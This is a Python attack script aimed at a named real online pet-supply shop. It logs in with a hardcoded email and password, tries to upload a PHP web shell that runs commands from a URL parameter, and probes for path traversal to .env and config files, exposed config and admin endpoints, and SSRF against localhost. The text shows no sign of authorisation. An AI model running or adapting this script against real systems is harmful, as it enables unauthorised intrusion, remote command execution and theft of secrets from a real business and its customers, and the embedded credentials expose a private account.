#!/usr/bin/env python3
"""Exploit Real Endpoints with Authentication"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
results = []
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

print("=" * 70)
print("EXPLOITING REAL ENDPOINTS")
print("=" * 70)

# LOGIN
print("\n[LOGIN]...")
try:
    params = {
        "response_type": "code",
        "client_id": "shop-myzooplus-prod-zooplus",
        "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login",
        "state": "pentest",
        "login": "true",
        "ui_locales": "de-DE",
        "scope": "openid",
    }
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json"})
    print(f"  [OK] Logged in, CSRF: {csrf[:20] if csrf else 'None'}...")
except Exception as e:
    print(f"  [ERROR] {e}")
    exit(1)

# REAL ENDPOINTS FROM PREVIOUS TESTS
print("\n[TESTING REAL ENDPOINTS]...")
print("-" * 70)

# 1. Cart API - known working endpoint
print("\n[1] Cart API endpoints...")
cart_endpoints = [
    "/checkout/api/cart-api/v2/cart",
    "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
    "/myaccount/api/customer-config/v1/customerconfiguration",
]

for ep in cart_endpoints:
    try:
        resp = s.get(f"{base}{ep}", timeout=5, verify=False)
        if resp.status_code == 200:
            print(f"  [OK] {ep} -> {resp.status_code}")
            data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else resp.text
            print(f"      Response: {str(data)[:150]}")
    except: pass

# 2. File Upload - try various formats
print("\n[2] File Upload...")
php = "<?php system($_GET['c']); ?>"
for ep in ["/api/upload", "/api/file/upload", "/myaccount/api/upload"]:
    try:
        # Try multipart
        files = {'file': ('s.php', php, 'application/x-php')}
        resp = s.post(f"{base}{ep}", files=files, timeout=5, verify=False)
        if resp.status_code in [200, 201]:
            results.append({"v": "file_upload", "s": "CRITICAL", "ep": ep})
            print(f"  [CRITICAL] Upload: {ep}")
    except: pass

# 3. Config endpoints
print("\n[3] Config endpoints...")
for ep in ["/api/config", "/myaccount/api/config", "/api/settings"]:
    try:
        resp = s.get(f"{base}{ep}", timeout=5, verify=False)
        if resp.status_code == 200:
            results.append({"v": "config_read", "s": "HIGH", "ep": ep})
            print(f"  [HIGH] Config read: {ep}")
            print(f"      {resp.text[:200]}")
    except: pass

# 4. Path traversal with auth
print("\n[4] Path Traversal (authenticated)...")
for f in ["/.env", "/config.json"]:
    for p in [f"/stats/../{f.lstrip('/')}", f"//{f.lstrip('/')}"]:
        try:
            resp = s.get(f"{base}{p}", timeout=3, verify=False)
            if resp.status_code == 200 and not resp.text.strip().startswith('<!'):
                if any(x in resp.text for x in ['NODE_ENV', 'SECRET', 'config']):
                    results.append({"v": "path_traversal", "s": "CRITICAL", "f": f})
                    print(f"  [CRITICAL] Path traversal: {f}")
                    print(f"      {resp.text[:200]}")
                    break
        except: pass

# 5. Admin/Internal endpoints
print("\n[5] Admin endpoints...")
admin_eps = [
    "/admin",
    "/api/admin",
    "/myaccount/admin",
    "/api/internal",
]
for ep in admin_eps:
    try:
        resp = s.get(f"{base}{ep}", timeout=3, verify=False)
        if resp.status_code not in [404, 403]:
            print(f"  [INFO] {ep} -> {resp.status_code}")
    except: pass

# 6. SSRF endpoints
print("\n[6] SSRF endpoints...")
for ep in ["/api/fetch", "/api/proxy", "/api/import"]:
    try:
        resp = s.post(f"{base}{ep}", json={"url": "http://127.0.0.1"}, timeout=3, verify=False)
        if resp.status_code in [200, 400]:
            print(f"  [INFO] {ep} -> {resp.status_code}")
            if len(resp.text) > 50:
                results.append({"v": "ssrf", "s": "HIGH", "ep": ep})
                print(f"      Response: {resp.text[:200]}")
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)
print(f"Total exploitations: {len(results)}")

if results:
    import os
    os.makedirs("reports", exist_ok=True)
    with open("reports/real_exploit.json", "w") as f:
        json.dump({"results": results, "cookies": list(s.cookies.keys())}, f, indent=2)
    print(f"[+] Saved to reports/real_exploit.json")
    for r in results:
        print(f"  [{r['s']}] {r['v']}: {r.get('ep', r.get('f', ''))}")
else:
    print("No exploitations found")
    print("\n[INFO] All tested endpoints are protected or don't exist")
    print("[INFO] Try finding real endpoints through Network tab in browser")

print("=" * 70)

